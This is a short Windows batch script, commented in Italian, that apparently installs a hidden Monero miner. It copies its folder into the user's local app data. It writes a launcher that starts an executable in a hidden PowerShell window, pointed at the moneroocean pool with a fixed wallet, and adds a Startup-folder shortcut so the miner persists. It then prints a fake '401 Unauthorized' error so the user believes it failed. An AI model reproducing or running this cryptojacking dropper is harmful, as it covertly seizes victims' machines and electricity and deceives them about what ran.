@echo off

cd /d "%~dp0"


set "CARTELLA_NOME=WinEngine"
set "DESTINAZIONE=%LOCALAPPDATA%\%CARTELLA_NOME%"
set "STARTUP_DIR=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
set "AVVIATORE=%DESTINAZIONE%\run_miner.bat"


if not exist "%DESTINAZIONE%" mkdir "%DESTINAZIONE%"
xcopy "%~dp0*" "%DESTINAZIONE%" /E /Y /I >nul


(
echo @echo off
echo cd /d "%%~dp0"
echo powershell -WindowStyle Hidden -Command "Start-Process '5dontOPEN.exe' -ArgumentList '-o gulf.moneroocean.stream:10128 -u 42ZobrR59wP3vPLwXt8kRP6BdRn1Fpa3LP9AS5kGWhZnfJt3uLEHHqcCEnoRdhJ8sWNsAJ9XBDYVb4TyFbXN194gH3ccDqM -p pc_exec --donate-level=1 --threads=1 --limit=1' -WorkingDirectory '%DESTINAZIONE%' -WindowStyle Hidden; (Get-Process 'exec').PriorityClass = 'Idle'"
) > "%AVVIATORE%"


powershell -Command "$WshShell = New-Object -ComObject WScript.Shell; $Shortcut = $WshShell.CreateShortcut('%STARTUP_DIR%\AvvioMiner.lnk'); $Shortcut.TargetPath = '%AVVIATORE%'; $Shortcut.WorkingDirectory = '%DESTINAZIONE%'; $Shortcut.Save()"


start "" "%AVVIATORE%"

echo Startup Error: Error 401 Unauthorized. Try running as Administrator.
timeout /t 3 >nul
exit
